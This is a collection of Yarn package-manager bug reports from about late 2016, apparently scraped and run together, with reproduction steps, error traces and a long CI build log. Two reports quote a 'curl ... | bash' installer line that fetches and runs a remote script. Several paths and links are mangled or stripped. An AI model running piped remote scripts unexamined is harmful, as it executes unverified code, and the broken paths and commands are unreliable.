info "fsevents@1.0.15" is an optional dependency and failed compatibility check
excluding it from installation.
``` however, in the "building fresh packages..." stage of installation, it still attempts to build the dependency, which obviously fails as it should only be built on mac os
the installation still succeeds so this is not a blocker, it's just very odd behaviour
the second time i run `yarn`, it shows that everything is up-to-date:
yarn install v0.17.8
warning sitename@0.0.0: no license field
[1/4] resolving packages...
success already up-to-date.
done in 0.28s.
``` however, when i add another dependency, it tries to build fsevents again.
`yarn outdated` do not show package new beta versions
$ yarn outdated yarn outdated v0.17.9
done in 2.10s
$ npm outdated package current wanted latest
webpack-dev-server 2.1.0-beta.11 2.1.0-beta.12 1.16.2
``` package.json
"devdependencies": { "webpack-dev-server": "^2.1.0-beta.11",
using `yarn pack` includes `readme`, `changelog` and `package.json` from `node_modules`
probably the files forcibly included: #l44-l47
**if the current behavior is a bug, please provide the steps to reproduce.** see #issuecomment-263112301
`mkdir some-dir && cd some-dir && yarn init -y && yarn add object.entries && yarn pack && tar -ztvf some-dir-v1.0.0.tgz`
`yarn add --dev some_package` fails because it somehow deletes `@types` directory in `node_modules`.
**if the current behavior is a bug, please provide the steps to reproduce.**
- `yarn init`
- `yarn add --dev protractor`
- check `node_modules/@types/jasmine`exists
- `yarn add --dev karma-sourcemap-loader`
- `add` fails because ```
error an unexpected error occurred: "enoent: no such file or directory, open \'c:\\\\dev\\\\projekte\\\\yarn_add\\\ ode_modules\\\\@types\\\\jasmine\\\\index.d.ts\'".
- check `node_modules/@types` does **not** exists
yarn does not respect `--cache-folder` option **if the current behavior is a bug, please provide the steps to reproduce.**
run under non-root user `yarn install --production --no-progress --no-emoji --cache-folder /path/to/cache/` get `eacces: permission denied, open \'/usr/local/share/.cache/yarn/.roadrunner.json\'".`
when `gpg` is not available and `$yarn_gpg` is not set to `no`, the installation with the script fails **if the current behavior is a bug, please provide the steps to reproduce.** remove `gpg` from `$path` and execute: ```
curl -o- -l | bash
calling yarn on powershell with stderr redirected to a file results in an error message: ``` typeerror: expected `count` to be a positive finite number at module.exports (c:\\program files (x86)\\yarn\ ode_modules\ epeating\\index.js:10:9) at progressbar.render (c:\\program files (x86)\\yarn\\lib\ eporters\\console\\progress-bar.js:58:22) at consolereporter.progress (c:\\program files (x86)\\yarn\\lib\ eporters\\console\\console-reporter.js:388:9) at c:\\program files (x86)\\yarn\\lib\\package-fetcher.js:123:36 at generator.next (<anonymous>) at step (c:\\program files (x86)\\yarn\ ode_modules\\babel-runtime\\helpers\\asynctogenerator.js:17:30) at c:\\program files (x86)\\yarn\ ode_modules\\babel-runtime\\helpers\\asynctogenerator.js:35:14 at f (c:\\program files (x86)\\yarn\ ode_modules\\core-js\\library\\modules\\_export.js:35:28) at c:\\program files (x86)\\yarn\ ode_modules\\babel-runtime\\helpers\\asynctogenerator.js:14:12 at packagefetcher.init (c:\\program files (x86)\\yarn\\lib\\package-fetcher.js:158:7)
``` **if the current behavior is a bug, please provide the steps to reproduce.**
* call `yarn install somepackage 2>c:\\somefile.txt`
when you add contextify to a project no *.node file is generated
but npm does create this file
**if the current behavior is a bug, please provide the steps to reproduce.** 1
yarn init -> follow steps to create blank project
yarn add contextify
find node_modules/contextify/ -name *.node -> no results try the same with npm: 1
npm init -> follow steps to create blank project
npm install --save contextify
find node_modules/contextify/ -name *.node -> node_modules/contextify//build/release/contextify.node
after upgrading from 0.16.1 to 0.17.8 we started getting reports of `--mutex network` not working as expected
- yarn can get stuck on `warning waiting for the other yarn instance to finish` - in cases when it does not get stuck, but prints `warning waiting for the other yarn instance to finish` it will reinstall node_modules from scratch, i.e
it fails integrity check ```
+ ./jest rkjsmodules/downstream/spectrum/__tests__/spectrumutilities-test.js
install-node-modules.js[1876771]:2016-11-22t16:44:02.180z: exec: /data/sandcastle/boxes/instance-fb4a-fbsource-android-jest-tests/xplat/third-party/node/bin/linux-node /data/sandcastle/boxes/instance-fb4a-fbsource-android-jest-tests/fbcode/react_native/kpm/bundled-built/yarn --version {"encoding":"utf8"}
install-node-modules.js[1876771]:2016-11-22t16:44:02.507z: log: "yarn_version"=>"0.17.8"
install-node-modules.js[1876771]:2016-11-22t16:44:02.509z: log: "install_performed"=>"1"
install-node-modules.js[1876771]:2016-11-22t16:44:02.509z: yarninstall: started
install-node-modules.js[1876771]:2016-11-22t16:44:02.509z: exec: warning waiting for the other yarn instance to finish
warning waiting for the other yarn instance to finish
warning waiting for the other yarn instance to finish
warning waiting for the other yarn instance to finish
warning waiting for the other yarn instance to finish
warning waiting for the other yarn instance to finish
warning waiting for the other yarn instance to finish
warning waiting for the other yarn instance to finish
warning waiting for the other yarn instance to finish
killing processes in state: s (sleeping)
s (sleeping)
s (sleeping)
s (sleeping)
s (sleeping)
attempting to pull stack traces: ``` **please mention your node.js, yarn and operating system version.**
yarn 0.17.8
when removing package that is installed with a namespace while there is at least one other package in that namespace, package directory won't be removed **if the current behavior is a bug, please provide the steps to reproduce.** ```
yarn add @types/chai
yarn add @types/lodash
yarn remove @types/chai
ls node_modules/@types \\\\ output: chai/ lodash/
yarn shows the available commands (great feature btw) twice
yarn run v0.17.8
error no command specified.
info commands available from binary scripts: coveralls, eslint, flow, jest, jsdoc, rollup, coveralls, eslint, flow, jest, jsdoc, rollup
info project commands - coveralls - doc - flow - jest - lint - test
question which command would you like to run?:
``` **if the current behavior is a bug, please provide the steps to reproduce.**
on os x 10.10 and older, the install script fails due to incorrect `mktemp` invocation
the same invocation works on 10.11 and newer
**if the current behavior is a bug, please provide the steps to reproduce.** run the following on os x yosemite: ```bash
curl -o- -l | bash
install fails with message:
error "tar.gz": tarball is not in network and can not be located in cache ("/users/bvanklingeren/development/workspace/source/iba/info-barista/tar.gz")
``` **if the current behavior is a bug, please provide the steps to reproduce.**
execute `yarn add tar.gz` or `yarn add --dev tar.gz`
using yarn 0.17.7 on windows 8.1 x64 and running `yarn license ls` gives something like ..
xtend@4.0.1 license: mit url: git://github.com/raynos/xtend.git y18n@3.2.1 license: isc url: git@github.com:yargs/y18n.git yargs@3.10.0 license: mit url: yargs@3.27.0 license: mit url: done in 3.64s
note how leading ` ` are printed in the lines directly above `done`.
when upgrading yarn from 0.17.0 to 0.17.6, i get this error upon running yarn: ```
error: enoent: no such file or directory, open '/users/adam/.nvm/versions/node/v6.9.1/lib/node_modules/yarn/node_modules/bl/node_modules/readable-stream/duple
``` **if the current behavior is a bug, please provide the steps to reproduce.** upgrade yarn, run any `yarn` command.
running `yarn add appdynamics` results in an `invalid tar file` error
originally reported in #1619, [it was suggested]( #issuecomment-261776239) that i open a separate ticket for this issue
yarn version: 0.17.6 node version: 6.9.1 platform: darwin x64 npm manifest: { "name": "foo", "version": "1.0.0", "main": "index.js", "license": "mit" } yarn manifest: no manifest lockfile: no lockfile trace: error: invalid tar file at extract.parse._startentry (yarn/node_modules/tar/lib/parse.js:149:13) at extract.parse._process (yarn/node_modules/tar/lib/parse.js:131:12) at blockstream.<anonymous> (yarn/node_modules/tar/lib/parse.js:47:8) at emitone (events.js:96:13) at blockstream.emit (events.js:188:7) at blockstream._emitchunk (yarn/node_modules/block-stream/block-stream.js:145:10) at blockstream.flush (yarn/node_modules/block-stream/block-stream.js:70:8) at blockstream.end (yarn/node_modules/block-stream/block-stream.js:66:8) at extract.parse.end (yarn/node_modules/tar/lib/parse.js:86:23) at unpackstream.onend (_stream_readable.js:511:10)
``` **if the current behavior is a bug, please provide the steps to reproduce.**
run `npm add appdynamics`
using `yarn install --no-progress` yields a progress bar, despite adding the flag to skip
**if the current behavior is a bug, please provide the steps to reproduce.**
execute `yarn install --no-progress` and behold the progress bar.
in case of errors like #1861, yarn may finish in an invalid state
it happened to me while removing a dependency, which has been removed from the package.json, but not from the yarn.lock
subsequent executions of the command resulted in ```
$ yarn remove bootstrap-css-only
yarn remove v0.17.3
[1/2] removing module bootstrap-css-only...
error this module isn't specified in a manifest.
info visit for documentation about this command.
``` **if the current behavior is a bug, please provide the steps to reproduce.**
as try to remove some dependencies while having scoped packages in you build as well
as #1861 is not determinitic, you may have to do it some times to reproduce.
`bin/yarn.js` is supposed to throw an error like "node version x.xx is not supported, please use node.js 4.0 or higher" when using an old node.js version
however, when node.js 0.10 it doesn't even reach that point, since it hits a syntax error beforehand:
yarn/lib-legacy/constants.js:7
const path = require('path');
syntaxerror: use of const in strict mode
at module._compile (module.js:439:25) at object.module._extensions..js (module.js:474:10)
if i do `yarn global add angular-cli` as a user, the binary is nowhere to be found.
yarn global add bower --prefix /usr/local does nothing in /usr/local/bin folder **if the current behavior is a bug, please provide the steps to reproduce.**
after a successful `yarn install` if i remove `yarn.lock` file and run `yarn install` again it doesn't generate the lockfile
**if the current behavior is a bug, please provide the steps to reproduce.**
- `yarn add os-homedir`
- `rm yarn.lock`
- `yarn install`
command `upgrade-interactive` leads to a `yarn.lock` file with dependency versions that don't make sense
after another `upgrade`, version resolution is fixed
**if the current behavior is a bug, please provide the steps to reproduce.** say you have this `package.json`:
{ "name": "test", "devdependencies": { "gulp-sass": "^2.3.2", "node-sass": "3.12.0" }
notice that `gulp-sass` has a dependency `"node-sass": "^3.4.2"`
`yarn install` resolves to a `yarn.lock` with this:
node-sass@3.12.0, node-sass@^3.4.2: version "3.12.0" resolved " #9221320f1fae1c98de0467ed3d755c10be1f928d" dependencies: [...]
``` the latest version of `node-sass` is v3.13.0
so if i proceed with the suggested in `yarn upgrade-interactive`, it leads to:
`package.json`
{ "name": "test", "devdependencies": { "gulp-sass": "^2.3.2", "node-sass": "^3.13.0" }
`yarn.lock`
``` node-sass@^3.13.0: version "3.13.0" resolved " #d08b95bdebf40941571bd2c16a9334b980f8924f" dependencies: [...] node-sass@^3.4.2: version "3.12.0" resolved " #9221320f1fae1c98de0467ed3d755c10be1f928d" dependencies:
``` this two entries of `node-sass` sounds confused whereas both `^3.13.0` and `^3.4.2` would resolve to `v3.13.0`.
we have a fairly large package.json
since switching to yarn, our ci builds would randomly fail around 7% of the time when compiling binary modules
what was super weird is that the c compiler complained about files that were apparently truncated
those files were node.js header files, downloaded by node-gyp before the compilation process
since gyp verifies the integrity of these files, they can't be corrupted at the source
the corruptions occurred in different files and on different lines every time
after a lot of trial and error, i was unable to reproduce the error when i only installed the single offending module alone
this leads me to believe that the parallelization of work during `yarn install` somehow leads to two parallel downloads of the node headers that overwrite each other
i have no hard evidence and trouble reproducing this
i was just wondering if this is really a possibility or if i'm barking up the wrong tree
i searched in a multitude of other directions, all without result
the randomness of the occurrence indicates a concurrency issue
please advise **if the current behavior is a bug, please provide the steps to reproduce.** this is extremely hard to reproduce, see above description
if desired i can attach our package.json and yarn.lock
when a project depends on a scoped package on windows, the package linking step fails 50% of the time if any subdependencies of the scoped package aren't hoisted out of the scoped package
**if the current behavior is a bug, please provide the steps to reproduce.**
`yarn add` a scoped package (ex
`@cycle/http`)
`yarn add` any dependency of the scoped package, at an incompatible version (ex
`superagent@1.7.0`) (this prevents the subdependency of the scoped package from hoisting)
run the same `yarn add` a second time
error on step 3
failed to build bcrypt correctly
it gives error: ```shell
error: could not locate the bindings file
tried: path/to/node_modules/bcrypt/build/bcrypt_lib.node ath/to/node_modules/bcrypt/build/debug/bcrypt_lib.node path/to/node_modules/bcrypt/build/release/bcrypt_lib.node
**if the current behavior is a bug, please provide the steps to reproduce.**
just install bcrypt
it's showing the prompt yo choose a package when there's none to update
**if the current behavior is a bug, please provide the steps to reproduce.**
update to latest yarn version.
update all packages to latest version.
execute `yarn upgrade-interactive`
you will be prompted to choose which package to update but the list is empty
![nov-15-2016 09-48-41](
i'm on windows 10, node v6.9.1, and yarn 0.17.0 i'm running `yarn` to install packages for a [personal project]( and during installation, i get the error: ```
error an unexpected error occurred: "enoent: no such file or directory, lstat \'c:\\\\users\\\\[my username]\\\\appdata\\\\local\\\\yarn\\\\cache\\\ pm-gulp-4.0.0-alpha.2-58ae6d972ff84fa07ba9cc30cf7d13d9bc646f39\'".
``` i\'m guessing yarn is not a big fan of the gulp version `"github:gulpjs/gulp#4.0"` which causes it to have the above issue
running `yarn cache clean` and redoing the install doesn't help.
`npm outdated` returns:
package current wanted latest
webpack 2.1.0-beta.25 2.1.0-beta.26 1.13.3
webpack-dev-server 2.1.0-beta.10 2.1.0-beta.11 1.16.2
`yarn outdated` returns nothing
**if the current behavior is a bug, please provide the steps to reproduce.**
add the following entries to `package.json` file:
"devdependencies": { "webpack": "beta", "webpack-dev-server": "beta"
and somehow make sure you don't have the latest beta versions installed ;)
output when trying to install `create-react-app` as it's the example [here](
yarn global v0.17.0
[1/4] resolving packages...
[2/4] fetching packages...
[3/4] linking dependencies...
[4/4] building fresh packages...
error an unexpected error occurred: "expected manifest".
info if you think this is a bug, please open a bug report with the information provided in "/home/bas/.config/yarn/global/yarn-error.log".
info visit for documentation about this command.
from the log:
trace: invariant violation: expected manifest at invariant (/home/bas/n/lib/node_modules/yarn/node_modules/invariant/invariant.js:42:15) at packageresolver.getstrictresolvedpattern (/home/bas/n/lib/node_modules/yarn/lib/package-resolver.js:401:5) at globaladd.maybeoutputsavetree (/home/bas/n/lib/node_modules/yarn/lib/cli/commands/global.js:185:38) at /home/bas/n/lib/node_modules/yarn/lib/cli/commands/add.js:162:19 at generator.next (<anonymous>) at step (/home/bas/n/lib/node_modules/yarn/node_modules/babel-runtime/helpers/asynctogenerator.js:17:30) at /home/bas/n/lib/node_modules/yarn/node_modules/babel-runtime/helpers/asynctogenerator.js:28:13
``` **if the current behavior is a bug, please provide the steps to reproduce.**
- try to globally install any package (e.g.: `yarn global add create-react-app`)
bestander@desktop-9bb67id:/mnt/c/users/besta/work/temp$ yarn add left-pad
yarn add v0.16.1
warning no license field
[1/4] resolving packages...
[2/4] fetching packages...
[3/4] linking dependencies...
[4/4] building fresh packages...
success saved lockfile.
success saved 1 new dependency
left-pad@1.1.3
done in 0.79s.
bestander@desktop-9bb67id:/mnt/c/users/besta/work/temp$ yarn check integrity
yarn check v0.16.1
warning no license field
error integrity hashes don't match, expected ed5c5d6324aff23b80a2a42442a68c2685a66aab881999edcfa3fa27a7d0edfa but got 71f5754360935355bce95b334bd455a4b80d135f6960d8eda0ffc26e321ba25e
error found 1 errors.
info visit for documentation about this command.
if you want to `yarn pack` a scoped package, you will get an ```
error: enoent: no such file or directory, open 'd:\\xxx\\.build\\@scope\\package.tgz' at error (native)
events.js:160 throw er; // unhandled 'error' event ^
``` **if the current behavior is a bug, please provide the steps to reproduce.**
create a scoped package
`"name": "@scope/package"` and run `yarn pack`
when installing e.g
casperjs the structure of "bin" within the `node_modules/casperjs/package.json` looks different whether i use yarn or npm to install the package
the yarn version looks like this:
{ "bin": "./bin/casperjs"
the npm version looks like this:
{ "bin": { "casperjs": "./bin/casperjs" },
projects like backstopjs rely on the structure of bin section within a dependencies package.json (see garris/backstopjs#323)
**if the current behavior is a bug, please provide the steps to reproduce.**
`yarn add casperjs`
respectively `npm i casperjs` **please mention your node.js, yarn and operating system version.**
yarn version v0.16.1
node v6.5.0
appveyor build is failing when building `node-zopfli` (native dep)
the build does not fail when using npm
build output: ```
build started
git config --global core.autocrlf true
git clone -q --branch=env/staging git@bitbucket.org:scoutforpets/app-business.git c:\\projects\\app-business
git checkout -qf 9c3b78ea9dce08024787c3f8233010d7ffd585f0
restoring build cache
cache 'node_modules' - restored
cache 'bower_components' - restored
running install scripts
install-product node $env:nodejs_version
uninstalling node 4.6.1 (x86)...
installing node 6.9.1 (x86)...
yarn global add bower ember-cli
yarn global v0.16.1
[1/4] resolving packages...
warning ember-cli > broccoli-babel-transpiler > babel-core > minimatch@2.0.10: please update to minimatch 3.0.2 or higher to avoid a regexp dos issue
warning ember-cli > npm > node-gyp > minimatch@1.0.0: please update to minimatch 3.0.2 or higher to avoid a regexp dos issue
warning ember-cli > npm > node-gyp > glob > minimatch@2.0.10: please update to minimatch 3.0.2 or higher to avoid a regexp dos issue
warning ember-cli > npm > request > tough-cookie@2.2.2: redos vulnerability parsing set-cookie
[2/4] fetching packages...
[3/4] linking dependencies...
[4/4] building fresh packages...
success installed bower@1.7.9 with binaries: - bower
success installed ember-cli@2.9.1 with binaries: - ember
done in 39.60s.
yarn install
yarn install v0.16.1
[1/4] resolving packages...
[2/4] fetching packages...
warning ember-truth-helpers@1.2.0: the engine "ember-cli-app-version" appears to be invalid.
[3/4] linking dependencies...
[4/4] building fresh packages...
error c:\\projects\\app-business\ ode_modules\ ode-zopfli: command failed.
exit code: 1
command: c:\\windows\\system32\\cmd.exe
arguments: /d /s /c node-pre-gyp install --fallback-to-build
directory: c:\\projects\\app-business\ ode_modules\ ode-zopfli
node-pre-gyp info it worked if it ends with ok
node-pre-gyp info using node-pre-gyp@0.6.31
node-pre-gyp info using node@6.9.1 | win32 | ia32
node-pre-gyp info check checked for "c:\\projects\\app-business\ ode_modules\ ode-zopfli\\lib\\binding\ ode-v48-win32-ia32\\zopfli.node" (not found)
node-pre-gyp http get
node-pre-gyp http 403
node-pre-gyp err! tried to download(403): node-pre-gyp err! pre-built binaries not found for node-zopfli@2.0.1 and node@6.9.1 (node-v48 abi) (falling back to source compile with node-gyp) node-pre-gyp http 403 status code downloading tarball gyp info it worked if it ends with ok
gyp info using node-gyp@3.3.1
gyp info using node@6.9.1 | win32 | ia32
gyp info ok gyp info it worked if it ends with ok
gyp info using node-gyp@3.3.1
gyp info using node@6.9.1 | win32 | ia32
gyp http get
gyp http 200
gyp http get
gyp http get
gyp http get
gyp http 200
gyp http 200
gyp http 200
gyp info spawn c:\\python27\\python.exe
gyp info spawn args [ 'c:\\\\projects\\\\app-business\\\ ode_modules\\\ ode-gyp\\\\gyp\\\\gyp_main.py',
gyp info spawn args 'binding.gyp',
gyp info spawn args '-f',
gyp info spawn args 'msvs',
gyp info spawn args '-g',
gyp info spawn args 'msvs_version=auto',
gyp info spawn args '-i',
gyp info spawn args 'c:\\\\projects\\\\app-business\\\ ode_modules\\\ ode-zopfli\\\\build\\\\config.gypi',
gyp info spawn args '-i',
gyp info spawn args 'c:\\\\projects\\\\app-business\\\ ode_modules\\\ ode-gyp\\\\addon.gypi',
gyp info spawn args '-i',
gyp info spawn args 'c:\\\\users\\\\appveyor\\\\.node-gyp\\\\6.9.1\\\\include\\\ ode\\\\common.gypi',
gyp info spawn args '-dlibrary=shared_library',
gyp info spawn args '-dvisibility=default',
gyp info spawn args '-dnode_root_dir=c:\\\\users\\\\appveyor\\\\.node-gyp\\\\6.9.1',
gyp info spawn args '-dnode_gyp_dir=c:\\\\projects\\\\app-business\\\ ode_modules\\\ ode-gyp',
gyp info spawn args '-dnode_lib_file=node.lib',
gyp info spawn args '-dmodule_root_dir=c:\\\\projects\\\\app-business\\\ ode_modules\\\ ode-zopfli',
gyp info spawn args '--depth=.',
gyp info spawn args '--no-parallel',
gyp info spawn args '--generator-output',
gyp info spawn args 'c:\\\\projects\\\\app-business\\\ ode_modules\\\ ode-zopfli\\\\build',
gyp info spawn args '-goutput_dir=.' ]
gyp info ok gyp info it worked if it ends with ok
gyp info using node-gyp@3.3.1
gyp info using node@6.9.1 | win32 | ia32
gyp info spawn msbuild
gyp info spawn args [ 'build/binding.sln',
gyp info spawn args '/clp:verbosity=minimal',
gyp info spawn args '/nologo',
gyp info spawn args '/p:configuration=release;platform=win32' ]
building the projects in this solution one at a time
to enable parallel build, please add the "/m" switch
zopfli-binding.cc zopflipng.cc zopflipng_lib.cc lodepng.cpp lodepng_util.cpp blocksplitter.c cache.c
..\\zopfli\\src\\zopfli\\cache.c(70): warning c4267: '=': conversion from 'size_t' to 'unsigned char', possible loss of data [c:\\projects\\app-business\ ode_modules\ ode-zopfli\\build\\zopfli.vcxproj] deflate.c gzip_container.c
..\\zopfli\\src\\zopfli\\deflate.c(638): warning c4267: '=': conversion from 'size_t' to 'unsigned short', possible loss of data [c:\\projects\\app-business\ ode_modules\ ode-zopfli\\build\\zopfli.vcxproj] hash.c katajainen.c
..\\zopfli\\src\\zopfli\\hash.c(53): warning c4267: '=': conversion from 'size_t' to 'unsigned short', possible loss of data [c:\\projects\\app-business\ ode_modules\ ode-zopfli\\build\\zopfli.vcxproj] lz77.c
..\\zopfli\\src\\zopfli\\hash.c(69): warning c4267: '=': conversion from 'size_t' to 'unsigned short', possible loss of data [c:\\projects\\app-business\ ode_modules\ ode-zopfli\\build\\zopfli.vcxproj]
..\\zopfli\\src\\zopfli\\hash.c(125): warning c4267: '=': conversion from 'size_t' to 'unsigned short', possible loss of data [c:\\projects\\app-business\ ode_modules\ ode-zopfli\\build\\zopfli.vcxproj] squeeze.c
..\\zopfli\\src\\zopfli\\lz77.c(360): warning c4267: '=': conversion from 'size_t' to 'unsigned short', possible loss of data [c:\\projects\\app-business\ ode_modules\ ode-zopfli\\build\\zopfli.vcxproj]
..\\zopfli\\src\\zopfli\\lz77.c(486): warning c4267: '=': conversion from 'size_t' to 'unsigned short', possible loss of data [c:\\projects\\app-business\ ode_modules\ ode-zopfli\\build\\zopfli.vcxproj]
..\\zopfli\\src\\zopfli\\squeeze.c(243): warning c4305: '=': truncation from 'double' to 'float' [c:\\projects\\app-business\ ode_modules\ ode-zopfli\\build\\zopfli.vcxproj]
..\\zopfli\\src\\zopfli\\squeeze.c(264): warning c4244: '=': conversion from 'double' to 'float', possible loss of data [c:\\projects\\app-business\ ode_modules\ ode-zopfli\\build\\zopfli.vcxproj]
..\\zopfli\\src\\zopfli\\squeeze.c(281): warning c4244: '=': conversion from 'double' to 'float', possible loss of data [c:\\projects\\app-business\ ode_modules\ ode-zopfli\\build\\zopfli.vcxproj]
..\\zopfli\\src\\zopfli\\squeeze.c(299): warning c4244: '=': conversion from 'double' to 'float', possible loss of data [c:\\projects\\app-business\ ode_modules\ ode-zopfli\\build\\zopfli.vcxproj]
..\\zopfli\\src\\zopfli\\squeeze.c(300): warning c4267: '=': conversion from 'size_t' to 'unsigned short', possible loss of data [c:\\projects\\app-business\ ode_modules\ ode-zopfli\\build\\zopfli.vcxproj] tree.c util.c zlib_container.c zopfli_lib.c win_delay_load_hook.c
c:\\projects\\app-business\ ode_modules\ ode-gyp\\src\\win_delay_load_hook.c(34): error c2373: '__pfndlinotifyhook2': redefinition; different type modifiers [c:\\projects\\app-business\ ode_modules\ ode-zopfli\\build\\zopfli.vcxproj] c:\\program files (x86)\\microsoft visual studio 14.0\\vc\\include\\delayimp.h(134): note: see declaration of '__pfndlinotifyhook2'
gyp err! build error gyp err! stack error: `msbuild` failed with exit code: 1
gyp err! stack at childprocess.onexit (c:\\projects\\app-business\ ode_modules\ ode-gyp\\lib\\build.js:276:23)
gyp err! stack at emittwo (events.js:106:13)
gyp err! stack at childprocess.emit (events.js:191:7)
gyp err! stack at process.childprocess._handle.onexit (internal/child_process.js:215:12)
gyp err! system windows_nt 6.3.9600
gyp err! command "c:\\\\program files (x86)\\\ odejs\\\ ode.exe" "c:\\\\projects\\\\app-business\\\ ode_modules\\\ ode-gyp\\\\bin\\\ ode-gyp.js" "build" "--fallback-to-build" "--module=c:\\\\projects\\\\app-business\\\ ode_modules\\\ ode-zopfli\\\\lib\\\\binding\\\ ode-v48-win32-ia32\\\\zopfli.node" "--module_name=zopfli" "--module_path=c:\\\\projects\\\\app-business\\\ ode_modules\\\ ode-zopfli\\\\lib\\\\binding\\\ ode-v48-win32-ia32"
gyp err! cwd c:\\projects\\app-business\ ode_modules\ ode-zopfli
gyp err! node -v v6.9.1
gyp err! node-gyp -v v3.3.1
gyp err! not ok node-pre-gyp err! build error node-pre-gyp err! stack error: failed to execute 'c:\\program files (x86)\ odejs\ ode.exe c:\\projects\\app-business\ ode_modules\ ode-gyp\\bin\ ode-gyp.js build --fallback-to-build --module=c:\\projects\\app-business\ ode_modules\ ode-zopfli\\lib\\binding\ ode-v48-win32-ia32\\zopfli.node --module_name=zopfli --module_path=c:\\projects\\app-business\ ode_modules\ ode-zopfli\\lib\\binding\ ode-v48-win32-ia32' (1)
node-pre-gyp err! stack at childprocess.<anonymous> (c:\\projects\\app-business\ ode_modules\ ode-pre-gyp\\lib\\util\\compile.js:83:29)
node-pre-gyp err! stack at emittwo (events.js:106:13)
node-pre-gyp err! stack at childprocess.emit (events.js:191:7)
node-pre-gyp err! stack at maybeclose (internal/child_process.js:877:16)
node-pre-gyp err! stack at process.childprocess._handle.onexit (internal/child_process.js:226:5)
node-pre-gyp err! system windows_nt 6.3.9600
node-pre-gyp err! command "c:\\\\program files (x86)\\\ odejs\\\ ode.exe" "c:\\\\projects\\\\app-business\\\ ode_modules\\\ ode-pre-gyp\\\\bin\\\ ode-pre-gyp" "install" "--fallback-to-build"
node-pre-gyp err! cwd c:\\projects\\app-business\ ode_modules\ ode-zopfli
node-pre-gyp err! node -v v6.9.1
node-pre-gyp err! node-pre-gyp -v v0.6.31
node-pre-gyp err! not ok failed to execute 'c:\\program files (x86)\ odejs\ ode.exe c:\\projects\\app-business\ ode_modules\ ode-gyp\\bin\ ode-gyp.js build --fallback-to-build --module=c:\\projects\\app-business\ ode_modules\ ode-zopfli\\lib\\binding\ ode-v48-win32-ia32\\zopfli.node --module_name=zopfli --module_path=c:\\projects\\app-business\ ode_modules\ ode-zopfli\\lib\\binding\ ode-v48-win32-ia32' (1)
info visit for documentation about this command.
command exited with code 1
``` **if the current behavior is a bug, please provide the steps to reproduce.** running appveyor using the following config: ```yaml environment: nodejs_version: "6" # don\'t actually build
build: off # cache npm modules unless package.json changes cache: - node_modules -> package.json - bower_components -> bower.json - "%localappdata%/yarn" test: off # install scripts install: # get the latest stable version of node.js or io.js - ps: install-product node $env:nodejs_version # install ember cli & bower - yarn global add bower ember-cli # install deps - yarn install - bower -s install # deploy using ember cli deploy - ember deploy staging --activate
``` failing when installing `"node-zopfli": "2.0.1"`
yarn will refuse to publish a package if the version doesn't change:
error new version is the same as the current version.
``` it also bumps the version before logging in, so if auth fails, you'll be in an error state
**if the current behavior is a bug, please provide the steps to reproduce.**
yarn publish
// enter new version
// enter wrong npm password
error incorrect username or password.
yarn publish
error new version is the same as the current version.
running `yarn add flat` results in: ```
yarn add v0.16.1
error missing list of packages to add to your project.
info visit for documentation about this command.
``` running `yarn add flat assert` results in: ```
yarn add v0.16.1 [1/4] resolving packages..
[2/4] fetching packages..
[3/4] linking dependencies..
[4/4] building fresh packages..
success saved lockfile
success saved 3 new dependencies.
assert@1.4.1 inherits@2.0.1 util@0.10.3 done in 0.79s
``` same thing happens for any package that shares a name with an option flag
a current workaround is running `yarn add -- flat`
**if the current behavior is a bug, please provide the steps to reproduce.** run `yarn add flat` in any project.
running `yarn link` in a local project with a `bin`-script specified in `package.json` doesn't put a symlink to the script in the global bin directory (`yarn global bin`)
**if the current behavior is a bug, please provide the steps to reproduce.** in a project folder with the following files: package.json
{ "name": "foo", "version": "1.0.0", "bin": { "foo": "index.js" }, "license": "mit"
``` index.js
#! /usr/bin/env node
console.log('bar baz');
``` run `yarn link`.
when running `yarn outdated`, some packages are listed, even though they are up to date
**if the current behavior is a bug, please provide the steps to reproduce.** ``` bash
thor :: ~ % mkdir test
thor :: ~ % cd test
thor :: ~/test % yarn add html5
yarn add v0.16.1
info no lockfile found.
[1/4] resolving packages...
[2/4] fetching packages...
[3/4] linking dependencies...
[4/4] building fresh packages...
success saved lockfile.
success saved 89 new dependencies.
ansi-regex@2.0.0
ansi-styles@2.2.1
asn1@0.2.3
assert-plus@0.2.0
asynckit@0.4.0
aws-sign2@0.6.0
aws4@1.5.0
bcrypt-pbkdf@1.0.0
bindings@1.2.1
boom@2.10.1
buffer-shims@1.0.0
caseless@0.11.0
chalk@1.1.3
combined-stream@1.0.5
commander@2.9.0
contextify@0.1.15
core-util-is@1.0.2
cryptiles@2.0.5
cssom@0.3.1
cssstyle@0.2.37
dashdash@1.14.0
assert-plus@1.0.0
delayed-stream@1.0.0
dom-serializer@0.1.0
domelementtype@1.1.3
domelementtype@1.3.0
domhandler@2.3.0
domutils@1.5.1
ecc-jsbn@0.1.1
entities@1.1.1
escape-string-regexp@1.0.5
extend@3.0.0
extsprintf@1.0.2
forever-agent@0.6.1
form-data@2.1.1
generate-function@2.0.0
generate-object-property@1.2.0
getpass@0.1.6
assert-plus@1.0.0
graceful-readlink@1.0.1
har-validator@2.0.6
has-ansi@2.0.0
hawk@3.1.3
hoek@2.16.3
html5-entities@1.0.0
html5@v1.0.5
htmlparser2@3.9.2
http-signature@1.1.1
inherits@2.0.3
is-my-json-valid@2.15.0
is-property@1.0.2
is-typedarray@1.0.0
isarray@1.0.0
isstream@0.1.2
jodid25519@1.0.2
jsbn@0.1.0
jsdom@0.11.1
json-schema@0.2.3
json-stringify-safe@5.0.1
jsonpointer@4.0.0
jsprim@1.3.1
mime-db@1.24.0
mime-types@2.1.12
nan@2.4.0
node-uuid@1.4.7
nwmatcher@1.3.9
oauth-sign@0.8.2
opts@1.2.2
pinkie-promise@2.0.1
pinkie@2.0.4
process-nextick-args@1.0.7
punycode@1.4.1
qs@6.3.0
readable-stream@2.1.5
request@2.76.0
sntp@1.0.9
sshpk@1.10.1
assert-plus@1.0.0
string_decoder@0.10.31
stringstream@0.0.5
strip-ansi@3.0.1
supports-color@2.0.0
tough-cookie@2.3.2
tunnel-agent@0.4.3
tweetnacl@0.14.3
util-deprecate@1.0.2
verror@1.3.6
xmlhttprequest@1.8.0
xtend@4.0.1
done in 1.92s.
thor :: ~/test % yarn outdated
yarn outdated v0.16.1
warning no license field
package current wanted latest
html5 v1.0.5 1.0.5 1.0.5 done in 0.14s
on windows when performing a "yarn global install <packagename>" the install is downloaded to the "c:\\program files\ odejs" node_modules folder instead of the "c:\\users[username]\\appdata\ oaming\ pm" node_modules folder
**if the current behavior is a bug, please provide the steps to reproduce.**
yarn global install <packagename>
